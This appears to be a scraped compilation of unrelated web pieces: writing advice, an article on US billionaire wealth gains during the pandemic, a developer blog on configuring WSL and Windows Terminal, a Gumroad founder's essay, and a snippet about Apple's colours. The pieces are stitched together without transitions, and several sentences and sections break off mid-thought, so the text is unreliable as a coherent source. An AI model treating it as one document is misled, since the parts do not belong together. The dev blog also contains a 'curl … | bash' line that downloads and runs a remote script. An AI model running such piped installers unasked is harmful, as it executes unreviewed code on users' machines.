<p>Telling writers to write short, concise sentences is like telling a director to keep their cuts 2-4 seconds in length for  whole movie, or telling a composer to only use 2-measure phrases for an entire song. It’s nonsense that covers up the true problem with long sentences: writing well-constructed long sentences is a skill to be practiced. The solution isn’t to ban long sentences, but to learn how to construct them artfully.</p>
<p>The correct advice <em>should</em> be, “write sentences that are easy to understand.” This is different than “don’t write long sentences.”</p>
<p>Write long sentences, if you must. Write short sentences, if they are fit to serve. Write whatever the hell kind of sentence you want. I don’t care. But whatever you do, write sentences that carry the full weight of your meaning, where you don’t have to chop up your ideas to fit short sentences or stretch out your ideas to cover long ones.</p>
<p>Writing is more than what you say, it’s also how you say it. Sentence length and rhythm are just two other tools in the toolbox of the writer, and we should learn to use them well rather than shy away from their sharp edges.</p>

		A running tally of how the pandemic has been increasing inequity at a fantastic rate.	</p><div>
		
<p><strong>By Chuck Collins</strong> /<a href="https://inequality.org/great-divide/updates-billionaire-pandemic/"> Inequality.org</a></p>



<p>The collective wealth of all U.S. billionaires has increased over $1.1 trillion since mid-March 2020, a nearly 40% leap during the past 10 months of national emergency. This wealth windfall could pay for all the relief for working families contained in the&nbsp;<a rel="noreferrer noopener" href="https://www.wsj.com/articles/biden-to-propose-1-9-trillion-covid-19-package-11610661977" target="_blank">$1.9 trillion coronavirus relief package</a>&nbsp;proposed by President Biden, while leaving the nation’s richest households no worse off than they were before COVID-19 hit.</p>



<p>The combined fortune of the nation’s 660 billionaires as of Monday, January 18, 2021 was $4.1 trillion, up 38.6% from their collective net worth of just under $3 trillion on March 18, 2020, the rough start of the pandemic, based on&nbsp;<em>Forbes</em>&nbsp;data compiled in&nbsp;<a href="https://docs.google.com/spreadsheets/d/1LGeUxuE-Z2OyNKu54JQIffS1v588iUvV6yd6D2vH6Vc/edit?usp=sharing" target="_blank" rel="noreferrer noopener">this report&nbsp;</a>by the Americans for Tax Fairness (ATF) and the Institute for Policy Studies (IPS). There have been 46 newly minted billionaires since the beginning of the pandemic, when&nbsp;<a href="https://americansfortaxfairness.org/issue/tale-two-crises-billionaires-gain-workers-feel-pandemic-pain/" target="_blank" rel="noreferrer noopener">there were 614</a>.</p>



<p>At $4.1 trillion, the total wealth of America’s 660 billionaires is two-thirds higher than the&nbsp;<a href="https://www.federalreserve.gov/releases/z1/dataviz/dfa/distribute/chart/" target="_blank" rel="noreferrer noopener">$2.4 trillion in total wealth</a>&nbsp;held by the bottom half of the population,&nbsp;<a href="https://www.census.gov/popclock/embed.php?component=counter" target="_blank" rel="noreferrer noopener">165 million Americans</a>.</p>



<p>March 18 is used as the unofficial beginning of the pandemic because by then most<a href="https://www.cnn.com/2020/03/13/politics/states-coronavirus-fema/index.html" target="_blank" rel="noreferrer noopener">&nbsp;federal</a>&nbsp;and<a href="https://www.foxnews.com/us/what-states-have-declared-coronavirus-emergencies" target="_blank" rel="noreferrer noopener">&nbsp;state</a>&nbsp;economic restrictions responding to the virus were in place. Moreover, March 18 was also the publication date of Forbes’ annual billionaires report in 2020. It provided a detailed baseline that ATF and IPS have been comparing periodically with real-time data from the&nbsp;<em>Forbes</em>&nbsp;website. This methodology has been&nbsp;<a href="https://www.politifact.com/factchecks/2020/oct/12/joe-biden/biden-says-billionaires-gained-800-billion-study-l/" target="_blank" rel="noreferrer noopener">favorably reviewed by PolitiFact</a>.</p>



<p><strong>The $1.1 trillion wealth gain by 660 U.S. billionaires since March 2020 could pay for:</strong></p>



<ul><li>All of the relief for working families contained in President Biden’s proposed $1.9 trillion pandemic rescue package, which includes $1,400 in direct payments to individuals, $400-a-week supplements to unemployment benefits, and an expanded child tax credit. (See table below)</li><li>A stimulus check of more than $3,400 for every one of the roughly&nbsp;<a rel="noreferrer noopener" href="https://www.census.gov/popclock/embed.php?component=counter" target="_blank">331 million people in the United States</a>. A family of four would receive over $13,000.&nbsp;<a rel="noreferrer noopener" href="https://thehill.com/homenews/senate/530913-gop-senator-blocks-bill-for-12k-stimulus-checks-for-second-time" target="_blank">Republicans in Congress resisted</a>&nbsp;sending families stimulus checks most of last year, claiming we couldn’t afford them.</li></ul>

Billionaires are overwhelmingly white men.</p>



<p>The stock market surge and lock-down economy have been a boon to tech monopolies and helped create multiple U.S. “centi-billionaires.” Jeff Bezos, Elon Musk, and Bill Gates were each worth more than $100 billion on Jan. 18. Prior to this year, Bezos had been the only U.S. centi-billionaire, reaching that peak in 2018. Bezos and other billionaires have seen particularly astonishing increases in wealth over the past 10 months:</p>



<ul><li><strong>Elon Musk’s</strong>&nbsp;wealth grew by over $154 billion, from $24.6 billion on March 18 to $179.2 billion on Jan. 18, a nearly eight-fold increase, boosted by his&nbsp;<strong>Tesla</strong>&nbsp;The boost in wealth of the SpaceX founder over the past 10 months is more than twice that of any other billionaire. That $154 billion growth in wealth is also about seven times NASA’s&nbsp;<a href="https://www.planetary.org/space-policy/nasas-fy-2020-budget#:~:text=NASA%27s%20budget%20in%20fiscal%20year%20%28FY%29%202020%20is,by%20a%20supplemental%20budget%20request%20on%2013%20May." target="_blank" rel="noreferrer noopener">$22.6 billion budget in FY2020</a>, the federal agency Musk has&nbsp;<a href="https://www.usatoday.com/story/news/nation/2020/05/26/spacex-how-elon-musk-took-idea-cusp-history/5257977002/" target="_blank" rel="noreferrer noopener">credited with saving his company</a>&nbsp;with a big federal contract when the firm’s rockets were failing and it faced bankruptcy.</li><li><strong>Jeff Bezos’s&nbsp;</strong>wealth grew from $113 billion on March 18 to $182 billion, an increase of 61%. Adding in his ex-wife MacKenzie Scott’s wealth of $55 billion on Jan. 18, the two had a combined wealth of almost a quarter of a trillion dollars thanks to their&nbsp;<strong>Amazon</strong>&nbsp;If Bezos’s $68.6 billion growth in wealth was distributed to all his&nbsp;<a href="https://www.nytimes.com/2020/11/27/technology/pushed-by-pandemic-amazon-goes-on-a-hiring-spree-without-equal.html" target="_blank" rel="noreferrer noopener">810,000 U.S. employees</a>, each would get a windfall bonus of almost $85,000 and Bezos would not be any “poorer” than he was 10 months ago.</li><li><strong>Mark Zuckerberg’s&nbsp;</strong>wealth grew from $54.7 billion on March 18 to $92 billion, an increase of over two-thirds fueled by his&nbsp;<strong>Facebook</strong></li></ul>



<p>Tax reform that ensures the wealthy pay their fair share—the principle&nbsp;<a href="https://americansfortaxfairness.org/issue/joe-bidens-tax-plan/" target="_blank" rel="noreferrer noopener">the Biden tax plan</a>&nbsp;is built on—would transform a good chunk of those huge billionaire gains into public revenue to help heal a hurting nation. But getting at that big boost in billionaire fortunes is not as simple as raising tax rates: tax rules let the rich delay, diminish and even ultimately avoid any tax on the growth in their wealth. What’s needed is structural change to how wealth is taxed.</p>



<p>The most direct approach is an annual wealth tax on the biggest fortunes, proposed by Senators&nbsp;<a href="https://elizabethwarren.com/plans/ultra-millionaire-tax" target="_blank" rel="noreferrer noopener">Elizabeth Warren</a>&nbsp;and&nbsp;<a href="https://berniesanders.com/issues/tax-extreme-wealth/" target="_blank" rel="noreferrer noopener">Bernie Sanders</a>, among others. Another option is the annual taxation of investment gains on stocks and other tradable assets, an idea advanced by the&nbsp;<a href="https://www.finance.senate.gov/ranking-members-news/wyden-unveils-proposal-to-fix-broken-tax-code-equalize-treatment-of-wages-and-wealth-protect-social-security-" target="_blank" rel="noreferrer noopener">new Senate Finance Committee chair, Ron Wyden</a>. Even under the current discounted tax rates for investment income, if Wyden’s plan had been in effect in 2020, America’s billionaires would be paying hundreds of billions of dollars in extra taxes this spring thanks to their gargantuan pandemic profits last year.</p>

<h4><strong>December 9, 2020 Update</strong></h4>



<p>According to a&nbsp;<a href="https://docs.google.com/spreadsheets/d/1qLbVmE3QyBh06GFFYkUv7eEWvz8DInZam4dx5vyLtT8/edit?usp=sharing" target="_blank" rel="noreferrer noopener">new report</a>&nbsp;by the Institute for Policy Studies (IPS) and Americans for Tax Fairness (ATF), the collective wealth of America’s 651 billionaires has jumped by over $1 trillion since roughly the beginning of the COVID-19 pandemic to a total of $4 trillion at market close on Monday, December 7, 2020. Combined, just the top 10 billionaires are now worth more than $1 trillion.</p>



<p>Their wealth growth since March is more than the&nbsp;<a href="https://www.washingtonpost.com/us-policy/2020/12/03/what-is-in-congressional-bailout-deal-stimulus-checks/" target="_blank" rel="noreferrer noopener">$908 billion in pandemic relief</a>&nbsp;proposed by a bipartisan group of members of Congress, which is likely to be the package that moves forward for a vote in the next week, but has been stalled over Republican concerns that it is too costly.</p>



<p>The total net worth of the nation’s 651 billionaires rose from $2.95 trillion on March 18—the rough start of the pandemic shutdowns—to $4.01 trillion on Dec. 7, a leap of 36%, based on an analysis of&nbsp;<em>Forbes</em>&nbsp;magazines research on billionaires. By around March 18 most&nbsp;<a href="https://www.cnn.com/2020/03/13/politics/states-coronavirus-fema/index.html" target="_blank" rel="noreferrer noopener">federal</a>&nbsp;and&nbsp;<a href="https://www.foxnews.com/us/what-states-have-declared-coronavirus-emergencies" target="_blank" rel="noreferrer noopener">state</a>&nbsp;economic restrictions in response to the virus were in place.</p>



<p>Forbes’ annual global billionaires report was published March 18, and ATF and IPS collected the real-time data on Dec. 7 from the&nbsp;<em>Forbes</em>&nbsp;website. The methodology of this analysis has been&nbsp;<a href="https://www.politifact.com/factchecks/2020/oct/12/joe-biden/biden-says-billionaires-gained-800-billion-study-l/" target="_blank" rel="noreferrer noopener">favorably reviewed by PolitiFact</a>. The ATF-IPS analysis also looks at wealth growth since February 2019—the date of Forbes’ immediately previous annual billionaires report published well before the start of the pandemic and resulting market gyrations.</p>



<p><strong>The $1 trillion wealth gain by 651 U.S. billionaires since mid-March is:</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="background"><a href="#background">→</a>Background</h2><p>I recently got the chance to completely reset my Windows 10 machine, and took advantage of the
opportunity to create a dev environment I would love. These were my high-level goals:</p><ul><li>Make WSL my primary dev environment</li><li>Use VSCode as my primary editor</li><li>Have a beautiful terminal</li></ul><h2 id="wsl-%26-vscode"><a href="#wsl-%26-vscode">→</a>WSL &amp; VSCode</h2><p>To achieve this, I started by installing WSL 2. I went with an Ubuntu distro because that's what
I've had the most experience with in the past. You can find instructions on installing WSL and/or
upgrading it to WSL 2 in the <a href="https://docs.microsoft.com/en-us/windows/wsl/install-win10">official
docs</a>.</p><p>Next I installed <a href="https://code.visualstudio.com/">VSCode</a>, and the <a href="https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.vscode-remote-extensionpack">Remote Development extension
pack</a>
which is where things start to get fun. With this extension pack installed, you can edit files in
the WSL filesystem seamlessly with VSCode.</p><h2 id="windows-terminal"><a href="#windows-terminal">→</a>Windows Terminal</h2><p>To get my beautiful terminal going, I installed <a href="https://devblogs.microsoft.com/commandline/windows-terminal-1-0/">Windows
Terminal</a> (WT), which is an
awesome new terminal experience for Windows from Microsoft.</p><p>Although I wanted WSL to be my primary dev environment, I still wanted working in Windows to be a
nice experience as well, so I wanted to make sure my PowerShell terminal was great too. To get that
going, I also installed the latest <a href="https://devblogs.microsoft.com/powershell/announcing-powershell-7-0/">PowerShell
7</a>.</p><p>Now it was time to setup my WT profiles. By default, WT creates a profile for WSL, PowerShell, cmd,
and Azure Cloud Shell. I'm not interested in using cmd or Azure Cloud Shell, and I'm going to be
using PowerShell 7 instead of PowerShell, so I disabled all but the WSL shell. To do this, simply
add the <code>"hidden": true</code> property to the profiles in the WT settings file (click the dropdown in the
header bar and then Settings or <span><kbd>Ctrl</kbd>+<kbd>,</kbd></span>).</p><h3 id="powershell-wt-profile"><a href="#powershell-wt-profile">→</a>PowerShell WT Profile</h3><p>Now to create my PowerShell 7 profile, I added the following object to the profiles array:</p><pre data-language="json" data-index="0"><code><span><span>{</span></span>
<span><span>  </span><span>"guid"</span><span>: </span><span>"</span><span>{346d54ee-6282-41c7-846a-0a2fa38ff66b}</span><span>"</span><span>,</span></span>
<span><span>  </span><span>"name"</span><span>: </span><span>"</span><span>PowerShell</span><span>"</span><span>,</span></span>
<span><span>  </span><span>"commandline"</span><span>: </span><span>"</span><span>pwsh.exe</span><span>"</span><span>,</span></span>
<span><span>  </span><span>"icon"</span><span>: </span><span>"</span><span>%SystemRoot%</span><span>\\</span><span>Installer</span><span>\\</span><span>{8B844F39-E6EE-486B-BE85-96A485AE2B96}</span><span>\\</span><span>PowerShellExe.ico</span><span>"</span><span>,</span></span>
<span><span>  </span><span>"startingDirectory"</span><span>: </span><span>"</span><span>D:</span><span>\\</span><span>code</span><span>"</span></span>
<span><span>}</span></span></code></pre><p>A few things to note:</p><ul><li>To generate a GUID, you can use the <a href="https://www.guidgenerator.com/online-guid-generator.aspx">Online GUID
Generator</a> website</li><li>I am using the <code>pwsh.exe</code> command instead of <code>powershell.exe</code> to use PowerShell 7</li><li>Follow these steps to find the icon path on your system:<ol><li>Open your Start menu and search for PowerShell 7</li><li>Right click on the app and click "Open file location"</li><li>In the file explorer that opens, right click the shortcut and click "Properties"</li><li>On the "Shortcut" tab, click the "Change Icon..." button and copy the file path</li></ol></li><li>I like to set the starting directory to be where I keep all my projects, and ideally this is near
the root of a drive to keep file paths as short as possible</li></ul><h3 id="ubuntu-wt-profile"><a href="#ubuntu-wt-profile">→</a>Ubuntu WT Profile</h3><p>Since I want to make WSL my primary environment, I moved its profile object to the top of the list
so that it will appear first in the new tab dropdown. Then I replaced the top-level <code>defaultProfile</code>
property with the WSL profile's <code>guid</code> property to make it the profile that is opened automatically
when WT launches.</p><p>Similarly to PowerShell, I wanted the starting directory to be <code>~/code</code>. If you try setting that
directly in the WT configuration, you'll find it doesn't work because WT doesn't know how to resolve
it. You can use an absolute path to get there instead, and you need to use a Windows file path that
WT can understand. You can access a WSL distro's file system from Windows using <code>\\wsl$\&lt;distro&gt;</code>, so, I added this property to the Ubuntu profile object: <code>"startingDirectory": "\\\\wsl$\\Ubuntu\\home\\blake\\code"</code> (where <code>Ubuntu</code> should be replaced with the name of your WSL
distro and <code>blake</code> with your WSL username).</p><h3 id="wt-theme"><a href="#wt-theme">→</a>WT Theme</h3><p>Finally, I wanted to get a new theme for my WT. I decided I would like to use the same colour scheme
as I was using for VSCode at the time, which was the <a href="https://marketplace.visualstudio.com/items?itemName=sdras.night-owl">Night
Owl</a> theme. So (naturally), <a href="https://chimerical.ca/posts/generate-windows-terminal-scheme">I
created</a> a <a href="https://marketplace.visualstudio.com/items?itemName=blake-mealey.generate-wt-scheme">VSCode
plugin</a> to
automatically generate a WT theme.</p><p>Here's what my terminal looks like with the Night Owl theme:</p><p><span>

  </a>
    </span></p><h2 id="shell-profiles"><a href="#shell-profiles">→</a>Shell Profiles</h2><p>Next up I wanted to get my shell profiles started. We'll iterate on these more later on. Your shell
profile is a script that gets run when the terminal starts which can be used to configure the
current environment. For PowerShell, this will be a PowerShell script and for WSL it will be a bash
script.</p><h3 id="powershell-profile"><a href="#powershell-profile">→</a>PowerShell Profile</h3><p>Let's start with PowerShell again. You can run <code>echo $PROFILE</code> to see if a profile script already
exists. For me it did, and it was located at
<code>C:\Users\blake\Documents\PowerShell\Microsoft.PowerShell_profile.ps1</code>. If it doesn't exist for you,
it's not a big deal. It seems that PowerShell looks in a <a href="https://devblogs.microsoft.com/scripting/understanding-the-six-powershell-profiles/">variety of
places</a> and you
can just create a script in the appropriate place and it should work. Here's what I added to my
profile script:</p><pre data-language="ps1" data-index="1"><code><span><span>#</span><span> C:\Users\blake\Documents\PowerShell\Microsoft.PowerShell_profile.ps1</span></span>
<span></span>
<span><span>Set-Alias</span><span> </span><span>-</span><span>Name editor </span><span>-</span><span>Value nano</span></span>
<span><span>Set-Alias</span><span> </span><span>-</span><span>Name edit </span><span>-</span><span>Value editor</span></span>
<span></span>
<span><span>function</span><span> </span><span>profile_alias</span><span> { editor $PROFILE }</span></span>
<span><span>Set-Alias</span><span> </span><span>-</span><span>Name profile </span><span>-</span><span>Value profile_alias</span></span>
<span></span>
<span><span>function</span><span> </span><span>reload_alias</span><span> { </span><span>&amp;</span><span> $PROFILE }</span></span>
<span><span>Set-Alias</span><span> </span><span>-</span><span>Name reload </span><span>-</span><span>Value reload_alias</span></span></code></pre><p>Let's break this down a bit. First of all, I am creating a couple aliases (<code>editor</code> and <code>edit</code>) for
my in-terminal editor. I prefer to use a terminal editor instead of a GUI editor because it reduces
context switching when working in the terminal, and is much faster to load the file to make a quick
edit. That said, if you wanted to use VSCode, you could replace <code>nano</code> with <code>code</code>.</p><p>The reason I create an alias for my editor command is so that I can change the editor at any time
and not have to change my muscle memory to use the new command. It also means I can create more
aliases that open the editor without having to change all of them if I change my editor.</p><p>Next, I add the <code>profile</code> alias which opens the profile script in my editor (the <code>editor</code> alias is
already coming in handy!). This is great because now I don't need to remember where my profile is
ever again, I can just run <code>profile</code> and can start editing it right away. I also add a <code>reload</code>
alias which simply reloads the shell using the profile script. This lets me use my changes to the
profile script without having to create a new terminal instance.</p><h3 id="bash-profile"><a href="#bash-profile">→</a>Bash Profile</h3><p>Now let's do the same thing for bash. In bash, the profile is a bash script located at <code>~/.bashrc</code>.
By default it contains a lot of stuff already, so I like to add my changes to the bottom of the
script. Here's what I added:</p><pre data-language="bash" data-index="2"><code><span><span>#</span><span> ~/.bashrc</span></span>
<span></span>
<span><span>export</span><span> EDITOR=</span><span>"</span><span>nano</span><span>"</span></span>
<span><span>alias</span><span> editor=</span><span>"</span><span>$EDITOR</span><span>"</span></span>
<span><span>alias</span><span> edit=</span><span>"</span><span>editor</span><span>"</span></span>
<span></span>
<span><span>export</span><span> PROFILE=</span><span>"</span><span>~/.bashrc</span><span>"</span></span>
<span><span>alias</span><span> profile=</span><span>"</span><span>editor </span><span>$PROFILE</span><span>"</span></span>
<span><span>alias</span><span> reload=</span><span>"</span><span>source </span><span>$PROFILE</span><span>"</span></span>
<span></span>
<span><span>alias</span><span> explorer=</span><span>"</span><span>explorer.exe</span><span>"</span></span></code></pre><p>This is very similar to the PowerShell script. First, we create an <code>EDITOR</code> environment variable.
Some Linux programs respect the <code>EDITOR</code> variable, so it's a good idea to set it if you want more
programs to know which editor you want to use. Then we use <code>EDITOR</code> to create our <code>editor</code> and
<code>edit</code> aliases just like before.</p><p>Then, I add the same <code>profile</code> and <code>reload</code> aliases to edit and reload the profile script.</p><p>Finally, I added another alias which maps <code>explorer</code> to <code>explorer.exe</code> which makes it the same
command for opening the Windows File Explorer in WSL as in PowerShell.</p><h2 id="terminal-editor"><a href="#terminal-editor">→</a>Terminal Editor</h2><p>Let's revisit our terminal editor. I started with nano because it's a pretty intuitive and easy to
use editor for terminals. I don't have a lot of terminal editor experience, so I'm not very handy
with Vim, and even nano can be a bit awkward to use.</p><p>So, I did a bit of research to see if there were any editors that had more similar keyboard
shortcuts and navigation to a modern GUI text editor, like VSCode. I found
<a href="https://micro-editor.github.io/">micro</a> which is available cross-platform, which is perfect!</p><h3 id="powershell-editor"><a href="#powershell-editor">→</a>PowerShell Editor</h3><p>Let's install it. In PowerShell, it's most easily installed via <a href="https://scoop.sh/">scoop</a> or
<a href="https://chocolatey.org/">Chocolatey</a>. If you don't have either installed yet I'd highly recommend
you do, as it makes installing programs in Windows a much easier experience. I'm going to use scoop
for the purposes of this guide. With scoop installed, simply run <code>scoop install micro</code>. Now you can
run <code>micro</code> to edit your files.</p><p>Let's update our profile script to use it:</p><pre data-language="ps1" data-index="3"><code><span><span>#</span><span> C:\Users\blake\Documents\PowerShell\Microsoft.PowerShell_profile.ps1</span></span>
<span></span>
<span><span>Set-Alias</span><span> </span><span>-</span><span>Name editor </span><span>-</span><span>Value micro</span></span></code></pre><h3 id="ubuntu-editor"><a href="#ubuntu-editor">→</a>Ubuntu Editor</h3><p>To install on Ubuntu, we can run the install script from the micro website:</p><pre data-language="bash" data-index="4"><code><span><span>curl https://getmic.ro </span><span>|</span><span> bash</span></span></code></pre><p>Now we can update our bash profile to use it:</p><pre data-language="bash" data-index="5"><code><span><span>#</span><span> ~/.bashrc</span></span>
<span></span>
<span><span>export</span><span> EDITOR=</span><span>"</span><span>micro</span><span>"</span></span></code></pre><h3 id="micro-theme"><a href="#micro-theme">→</a>Micro Theme</h3><p>One issue you might notice once you start editing in micro is that it's theme clashes with your WT
theme. One option could be to port your WT theme to micro, but this is quite a bit of work. I found
using the built-in <code>simple</code> theme uses your terminal theme's background colour and seems to fit
quite well for me.</p><p>To do this, you'll have to configure micro for PowerShell and WSL separately. To configure it, open
micro, press <span><kbd>Ctrl</kbd>+<kbd>E</kbd></span> to open the command prompt, then enter the command <code>set colorscheme simple</code>.</p><h2 id="terminal-prompt"><a href="#terminal-prompt">→</a>Terminal Prompt</h2><p>Finally, to make our terminal really pretty, we need to customize the prompt. There's lots of
options out there for this, but the most popular one seems to be
<a href="https://github.com/ohmyzsh/ohmyzsh">ohmyzsh</a> for Bash and
<a href="https://github.com/JanDeDobbeleer/oh-my-posh">oh-my-posh</a> for PowerShell. I'm not a huge fan of
these because in my experience they slow down the terminal to a point which makes me frustrated to
use them, and since they are separate solutions for each environment they must be configured separately.</p><p>Enter <a href="https://starship.rs/">Starship</a>, a "blazing-fast," cross-platform alternative with a
delightfully simple prompt and some awesome customization (with the promise of even more coming in
future releases). Since WSL and PowerShell both have access to the Windows filesystem, we can even
store the Starship configuration in a central place and have both pull from it.</p><h3 id="powershell-starship"><a href="#powershell-starship">→</a>PowerShell Starship</h3><p>To install Starship for PowerShell, we can again use scoop: <code>scoop install starship</code>. To load
starship, we again need to edit our profile (now with our snazzy editor and single-command alias):</p><pre data-language="ps1" data-index="6"><code><span><span>#</span><span> C:\Users\blake\Documents\PowerShell\Microsoft.PowerShell_profile.ps1</span></span>
<span></span>
<span><span>Invoke-Expression</span><span> (</span><span>&amp;</span><span>starship init powershell)</span></span></code></pre><p>Now we can run our <code>reload</code> alias and see the beautiful prompt immediately.</p><h3 id="bash-starship"><a href="#bash-starship">→</a>Bash Starship</h3><p>Installing Starship for …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><label>Feb 7, 2019</label><h2>Reflecting on My Failure to Build a Billion-Dollar Company</h2><p>In 2011, I left my job as the second employee at Pinterest — before I vested any of my stock — to work on what I thought would be my life’s work.</p><blockquote><p lang="en" dir="ltr">Just had an idea for my first billion-dollar company. Tomorrow, I start building it.</p>— Sahil Lavingia (@shl) <a href="https://twitter.com/shl/status/54072049395712000?ref_src=twsrc%5Etfw">April 2, 2011</a></blockquote> <p>I thought Gumroad would become a billion-dollar company, with hundreds of employees. It would IPO, and I would work on it until I died. Something like that.</p><p>Needless to say, that didn’t happen.</p><p>Now, it may look like I am in an enviable position, running a profitable, growing, low-maintenance software business serving adoring customers. But for years, I considered myself a failure. At my lowest point, I had to lay off 75 percent of my company, including many of my best friends. I had failed.</p><p>It took me years to realize I was misguided from the outset. I no longer feel shame in the path I took to get to where I am today — but for a long time, I did. This is my journey, from the beginning.</p><h2>A weekend project turned VC-backed startup</h2><p>The idea behind Gumroad was simple: Creators and others should be able to sell their products directly to their audiences with quick, simple links. No need for a storefront.</p><p>I built Gumroad the weekend I thought up the idea, and launched it early Monday morning on Hacker News. The reaction exceeded my grandest aspirations. Over 52,000 people checked it out on the first day.</p><p>Later that year, I left my job as the second employee at Pinterest — before I vested any of my stock — to turn Gumroad into what I thought would become my life’s work.</p><p>Almost immediately, I raised $1.1M from an all-star cast of angel investors and venture capital firms, including Max Levchin, Chris Sacca, Ron Conway, Naval Ravikant, Collaborative Fund, Accel Partners, and First Round Capital. A few months later, in May 2012, we raised $7M more. Mike Abbott from Kleiner Perkins Caufield &amp; Byers (KPCB), a top-tier VC firm, led the round.</p><p>I was on top of the world. I was just 19, a solo founder, with over $8M in the bank and three employees. The world was starting to take note.</p><p>We grew the team. We stayed focused on our product. The monthly numbers started to climb. And then, at some point, they didn’t.</p><p>To keep the product alive, I laid off 75 percent of my company — including many of my best friends. It really sucked. But I told myself things would be fine: The product would continue to grow and no one far from the company would ever find out.</p><p>Then, TechCrunch got wind of the layoffs and published “Layoffs Hit Gumroad As The E-Commerce Startup Restructures.” All of a sudden, my failure was public. I spent the week ignoring my support network and answering our customers’ concerns, many of whom relied on us to power their businesses. They wanted to know if they should look for alternative products. Some of our favorite, most successful creators left. This hurt, but I don’t blame them for trying to minimize the risk in their own businesses.</p><p>So what exactly went wrong, and when?</p><h2>Failing in style</h2><p>Let’s start with the numbers. This is our monthly processed volume, until the layoffs:</p><p><img src="https://sahillavingia.com/0_z7tBf5i6wH-HbLhU.png"></p><p>It doesn’t look too bad, right? It’s going in the right direction: up.</p><p>But we were venture-funded, which was like playing a game of double-or-nothing. It’s euphoric when things are going your way — and suffocating when they’re not. And we weren’t doubling fast enough to raise the $15M+ Series B (the second major round of funding) we were looking for to grow the team.</p><p>For the type of business we were trying to build, every month of less than 20 percent growth should have been a red flag.</p><p>But at the time, I thought it was okay. We had money in the bank and product-market fit. We would continue to ship product and things would work out. The online creator movement was still nascent; the slow growth wasn’t our fault. It always looked like change was right around the corner.</p><p>But now, I realize: It doesn’t matter whose “fault” it is; we hit a peak in November 2014 and stalled. A lot of creators absolutely loved us, but there weren’t enough of them who needed our specific product offering. Product-market fit is great, but we needed to find a new, larger fit to justify raising more money (and then do it again and again, until acquisition or IPO).</p><p>In January 2015, after our final double-or-nothing hail-mary, our bank balance dipped below 18 months of runway. I told my 20-person team the road ahead would be a tough one. We didn’t have the numbers to raise a Series B, and we would have to work really hard over the next nine months to get even close. To that end, we deprioritized everything except features that would directly move the needle. Many were not core to our business, but we needed to try everything we could to get our monthly processed volume to where it needed to be.</p><p>If we succeeded, we would raise money from a top-tier VC again, hire more people, and pick up the journey where we’d left off. If we didn’t, we would have to drastically downsize the company.</p><p>In those nine months, when the whole team knew we were fighting for our company’s life, not a single person left Gumroad. From “this is gonna be hard,” to “yep, turns out it was,” every single person worked harder than ever.</p><p>We launched a “Small Product Lab” to teach new creators how to grow and sell. We shipped a ton of features, including weekly payouts, payouts to debit cards, payouts to the U.K., Australia, and Canada, various additions to our email features, product recommendations and search, analytics to see how customers are reading/watching/downloading the products they’ve purchased, and add-to-cart functionality. And that was just between August and November.</p><p>Unfortunately, we didn’t hit the numbers we needed.</p><h2>Slim down or shut down?</h2><p>Looking back, I’m glad we didn’t hit those numbers. If we’d doubled down, raised more money, and appeared in the headlines again, there would have been a very real possibility of even more spectacular failure.</p><p>With that off the table, our options were:</p><p>Shut down the business, return the remaining money to investors, and try something new.</p><p>Continue with a slimmed-down version of the company to aim for sustainability.</p><p>Position the company for an acquihire.</p><p>Some of my investors wanted me to shut down the business. They tried to convince me that my time was worth more than trying to keep a small business like Gumroad afloat, and I should try to build another billion-dollar company armed with all of my learnings — and their money.</p><p>I tended to agree with them, to be honest. But I was accountable to our creators, our employees, and our investors — in that order. We helped thousands of creators get paid, every month. About $2,500,000 was going to go into the pockets of creators — for rent checks and mortgages, for student loans and kids’ college funds. And it was only growing! Could I really just turn that faucet off?</p><p>If I sold the company, it would be mostly for our stellar team — and I would no longer be able to control the destiny of the product. There were too many acquisition stories of companies promising exciting journeys and amazing synergies to come — and ending with a deprecated product a year later.</p><p>Selling was certainly tempting. I could say I sold my first company, raise more money, and do this all again with a new idea. But that didn’t sit right with me. We were responsible to our creators first. That’s what I told every new hire and every investor. I didn’t want to become a serial entrepreneur and risk disappointing yet another customer base.</p><p>We decided to become profitable at any cost. The next year was not fun: I shrunk the company from twenty employees to five. We struggled to find a new tenant for our $25,000/month office. We focused all of our remaining resources on launching a premium service.</p><p>In June 2015, a few months before our layoffs, our financials looked like this:</p><ul><li>Revenue: $89,000 for the month</li><li>Gross profit: $17,000</li><li>Operating expenses: $364,000</li><li><strong>Net profit: -$351,000</strong></li></ul><p>A year later, in June 2016, our monthly numbers looked like this:</p><ul><li>Revenue: $176,000 for the month</li><li>Gross profit: $42,000</li><li>Operating expenses: $32,000</li><li><strong>Net profit: +$10,000</strong></li></ul><p>It hurt, but it meant creators would keep getting paid. It also meant that we were in control of our own destiny.</p><h2>From skeleton crew to lifestyle business</h2><p>It got worse from there.</p><p>Gumroad was no longer the venture-funded, fast-growing startup our investors and employees signed up for. As everyone else found other opportunities, the skeleton crew fizzled from five to one.</p><p>I was basically alone. I didn’t have a team, nor an office. And San Francisco was full of startups raising gobs of money, building amazing teams, and shipping great products. Some of my friends became billionaires. Meanwhile, I was running a “measly” lifestyle business. It wasn’t what I wanted to do, but I had to keep the ship from sinking.</p><p>Now, I understand some people would dream to be in that position. But at the time, I just felt trapped. I couldn’t stop, but there was only so much I could do as an army of one.</p><p>For years, my only metric of success was building a billion-dollar company. Now, I realize that was a terrible goal.</p><p>I shut off the rest of the world. I didn’t tell my mom about the layoffs — she had to read the article and tweets herself to find out. My friends were worried, but I assured them I was neither depressed nor suicidal. I left San Francisco for long stretches at a time, thinking that some travel would give me adequate distance. It only made me more lonely.</p><p>Every day, I woke up and took care of all of Gumroad’s support queries. I tried to fix all of the bugs I could. Often, I had to ask for help from former Gumroad engineers. They were all employed by then, but they always found time to help. Once all things Gumroad were taken care of, I tried to go to the gym, and if I had the willpower, work on a side project (a fantasy novel). Most days, I failed.</p><p>To me, happiness is about an expectation of positive change. Every year before 2016, there …</p></div></div>

<p>When most people hear Apple in a sentence, their next thought is likely the color. This is because color has always played an exciting role in Apple’s history: from the original Mac to the iMac, from the G3 to the Cube, from Bondi Blue to Snow White. The introduction of color played a vital part in these products' success as it helped create strong visual brand recognition.</p>
